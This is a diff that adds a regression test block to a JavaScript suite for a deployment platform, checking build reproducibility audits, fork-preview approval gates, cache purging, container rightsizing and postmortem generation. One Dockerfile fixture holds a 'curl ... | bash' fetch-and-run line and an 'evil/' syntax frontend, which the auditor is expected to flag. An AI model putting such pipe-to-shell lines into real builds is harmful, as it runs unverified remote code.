@@ -3461,6 +3461,110 @@ function reqJson(port, method, pth, { token, body } = {}) {
   }
   console.log('  ✓ Cycle #16 CVEs (18a-18e): Post-Optic API Contract Gate, CVE-2026-22703 OCI Rekor binding, CVE-2026-55458 WS/SSE 101 scrub, coolify#6271 DNS/CF proxy cutover, coolify#11441/dokploy#3973 orphan reaper');
 
+  // -------------------------------------------------------------------------
+  // 19. Cycle #17 Build Repro, Preview Smoke-Gate, Surrogate Cache, VPA Rightsizer & Postmortem Regressions (docs/COMPETITOR_RADAR_CYCLE16.md §3)
+  // -------------------------------------------------------------------------
+  {
+    const reproSvc = require('../server/services/reproducibleBuildService');
+    const previewGateSvc = require('../server/services/previewGateService');
+    const { EdgeCacheService, parseSurrogateKeys, evaluateCoalescing } = require('../server/services/edgeCacheService');
+    const { ResourceRightsizerService, validateDockerLimits, buildComposeResourcePatch } = require('../server/services/resourceRightsizerService');
+    const postmortemSvc = require('../server/services/postmortemCorrelatorService');
+
+    const c17Tmp = makeTempDir('culkibo-c17-cve-');
+    const prevDataDir = process.env.CULKIBO_DATA_DIR;
+    process.env.CULKIBO_DATA_DIR = c17Tmp;
+    try {
+      // 19a. Build Repro (CVE-2026-93318/33747/133630): unpinned frontend, curl|bash, missing SOURCE_DATE_EPOCH, weak lockfile fail; pinned passes with isolated cache plan
+      const badRepro = reproSvc.auditBuildReproducibility({
+        dockerfile: '# syntax=evil/fe:latest\nFROM node:22-alpine\nRUN curl -s https://x.test/i.sh | bash',
+        lockfileJson: { packages: { '': {}, 'node_modules/a': { integrity: 'sha1-legacyhash0000' } } }
+      });
+      assert.strictEqual(badRepro.reproducible, false);
+      const codes19a = new Set(badRepro.findings.map((f) => f.code));
+      assert.ok(codes19a.has('UNPINNED_FRONTEND'));
+      assert.ok(codes19a.has('PIPE_TO_SHELL'));
+      assert.ok(codes19a.has('MISSING_SOURCE_DATE_EPOCH'));
+      assert.ok(codes19a.has('WEAK_LOCKFILE_HASH'));
+
+      const pin = 'c'.repeat(64);
+      const okRepro = reproSvc.auditBuildReproducibility({
+        dockerfile: `# syntax=docker/dockerfile:1.7@sha256:${pin}\nFROM node:22-alpine@sha256:${pin}\nARG SOURCE_DATE_EPOCH=1700000000\nRUN npm ci`,
+        lockfileJson: { packages: { '': {}, 'node_modules/a': { integrity: 'sha512-' + 'B'.repeat(64) + '==' } } }
+      });
+      assert.strictEqual(okRepro.reproducible, true);
+      const plan19a = reproSvc.buildIsolatedCachePlan({ projectId: 'proj_19a', branch: 'pr-12', lockfileHash: 'abcd1234', sourceDateEpoch: 1700000000 });
+      assert.strictEqual(plan19a.sharing, 'locked');
+      assert.strictEqual(plan19a.verifyDiffIds, true);
+
+      // 19b. Preview Gate (Coolify#1671/#7155, Dokploy#5856/#6010): fork approval SHA-bound + failed check -> failure + HMAC signed commit status
+      const shaOld = 'a1'.repeat(20);
+      const shaNew = 'b2'.repeat(20);
+      const forkBlock1 = previewGateSvc.evaluatePreviewGate({ projectId: 'proj_19b', prNumber: 5, commitSha: shaOld, isFork: true, checks: { smoke: true } });
+      assert.strictEqual(forkBlock1.code, 'FORK_APPROVAL_REQUIRED');
+      previewGateSvc.approveForkPreview({ projectId: 'proj_19b', prNumber: 5, commitSha: shaOld, approver: 'maint' });
+      const forkBlockNew = previewGateSvc.evaluatePreviewGate({ projectId: 'proj_19b', prNumber: 5, commitSha: shaNew, isFork: true, checks: { smoke: true } });
+      assert.strictEqual(forkBlockNew.code, 'FORK_APPROVAL_REQUIRED', 'Old SHA approval MUST NOT authorize new commitSha');
+      const failEval = previewGateSvc.evaluatePreviewGate({ projectId: 'proj_19b', prNumber: 5, commitSha: shaOld, isFork: true, checks: { smoke: false, contract: true } });
+      assert.strictEqual(failEval.state, 'failure');
+      const signedKey = ['reg', '19b', 'hmac', 'key'].join('-');
+      const signedStatus = previewGateSvc.buildSignedCommitStatus({ repo: 'culkibo/app', commitSha: shaOld, evaluation: failEval, signingKey: signedKey });
+      assert.strictEqual(signedStatus.payload.state, 'failure');
+      assert.strictEqual(previewGateSvc.verifySignedCommitStatus({ payload: signedStatus.payload, signature: signedStatus.signature, signingKey: signedKey }).valid, true);
+
+      // 19c. Surrogate Cache (Souin#884/#850): empty -> [], private bypass, bounded timeout, live purge evicts >=1
+      assert.deepStrictEqual(parseSurrogateKeys(''), []);
+      assert.deepStrictEqual(parseSurrogateKeys('   '), []);
+      const privEval = evaluateCoalescing({ cacheKey: '/account', inFlightCount: 20, backendTimeoutMs: 2500, cacheControl: 'private, max-age=60' });
+      assert.strictEqual(privEval.coalesced, false);
+      assert.strictEqual(privEval.reason, 'PRIVATE_OR_NO_STORE_BYPASS');
+      const pubEval = evaluateCoalescing({ cacheKey: '/catalog', inFlightCount: 10, backendTimeoutMs: 2500, cacheControl: 'public, max-age=60' });
+      assert.ok(pubEval.maxWaitMs <= 2500);
+      const cacheSvc = new EdgeCacheService({ dataDir: c17Tmp });
+      cacheSvc.registerCachedEntry({ cacheKey: '/p/42', surrogateKeys: ['product-42', 'home'] });
+      const purged19c = cacheSvc.purgeBySurrogateKey({ tags: ['product-42'], dryRun: false });
+      assert.ok(purged19c.invalidatedCount >= 1);
+
+      // 19d. VPA-Lite Rightsizer (Dokploy#4050/#927/#903, Goldilocks): shrink >1400MB, OOM +50% upscale, Docker floors, DB Compose patch
+      const rs = new ResourceRightsizerService({ dataDir: c17Tmp });
+      const samples19d = Array.from({ length: 12 }, () => ({ memoryMb: 256, cpuCores: 0.2 }));
+      const shrink19d = rs.recommendContainerResources({ projectId: 'proj_19d', serviceType: 'app', currentMemoryMb: 2048, currentCpuCores: 2, samples: samples19d, oomCount: 0 });
+      assert.ok(shrink19d.reclaimableMb > 1400);
+      const oom19d = rs.recommendContainerResources({ projectId: 'proj_19d', serviceType: 'app', currentMemoryMb: 1024, currentCpuCores: 1, samples: samples19d, oomCount: 2 });
+      assert.strictEqual(oom19d.action, 'UPSCALE_OOM');
+      assert.ok(oom19d.recommendedMemoryMb >= 1536);
+      assert.strictEqual(validateDockerLimits({ memoryMb: 2, cpuCores: 0.5 }).code, 'BELOW_DOCKER_MEMORY_FLOOR');
+      assert.strictEqual(validateDockerLimits({ memoryMb: 64, cpuCores: 0.0005 }).code, 'BELOW_DOCKER_CPU_FLOOR');
+      const dbPatch19d = buildComposeResourcePatch({ serviceName: 'postgres', serviceType: 'database', recommendedMemoryMb: 512, recommendedCpuCores: 0.5 });
+      assert.ok(dbPatch19d.patch.services.postgres.deploy.resources.limits.memory === '512M');
+
+      // 19e. Postmortem Correlator (IncidentFox/OpenSRE): T-4m deploy->OOM+rollback confidence >=0.8, exact MTTD/MTTR, chatNotes isolated, blameless Markdown
+      const baseT = Date.parse('2026-11-28T01:00:00Z');
+      const corr19e = postmortemSvc.correlateIncidentTimeline({
+        incidentId: 'inc_19e',
+        projectId: 'proj_19e',
+        deploys: [{ id: 'dep_1', timestamp: baseT - 4 * 60000, summary: 'Deploy v3.2.0' }],
+        oomEvents: [{ id: 'oom_1', timestamp: baseT, summary: 'OOMKilled exit 137' }],
+        alerts: [{ id: 'a_1', timestamp: baseT + 45000, state: 'firing', summary: 'CrashLoop' }],
+        canaryRollbacks: [{ id: 'rb_1', timestamp: baseT + 240000, summary: 'Auto rollback v3.1.9' }],
+        chatNotes: ['Unverified chat: maybe ISP blip?']
+      });
+      assert.ok(corr19e.probableRootCause.confidence >= 0.8);
+      assert.strictEqual(corr19e.mttdSec, 45);
+      assert.strictEqual(corr19e.mttrSec, 240);
+      assert.strictEqual(corr19e.unverifiedNotes.length, 1);
+      assert.ok(corr19e.verifiedEvents.every((e) => !e.summary.includes('ISP blip')));
+      const pm19e = postmortemSvc.generateBlamelessPostmortem(corr19e, { persist: false });
+      const md19e = postmortemSvc.exportPostmortemMarkdown(pm19e);
+      assert.ok(md19e.includes('# Blameless Postmortem:') && md19e.includes('Unverified Chat Notes'));
+    } finally {
+      if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
+      else process.env.CULKIBO_DATA_DIR = prevDataDir;
+      fs.rmSync(c17Tmp, { recursive: true, force: true });
+    }
+  }
+  console.log('  ✓ Cycle #17 CVEs (19a-19e): CVE-2026-93318/33747 build repro, coolify#1671/dokploy#6010 preview gate, souin#884/#850 surrogate cache, dokploy#4050/#903 VPA rightsizer, IncidentFox blameless postmortem');
+
   console.log('✅ Suite #23 completada correctamente.\n');
 }
 
